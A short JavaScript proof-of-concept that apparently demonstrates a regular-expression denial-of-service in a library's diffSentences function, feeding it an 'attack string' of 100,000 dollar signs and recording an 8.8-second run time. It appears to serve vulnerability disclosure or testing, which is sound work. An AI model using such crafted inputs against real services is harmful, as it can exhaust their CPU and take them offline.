import { diffSentences } from "./index.mjs";

//Attack String :""+"$"*100000+" "
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "$";
}
str += " ";

var result = diffSentences(str, "", "");

// real    0m8.787s
// user    0m8.743s
// sys     0m0.020s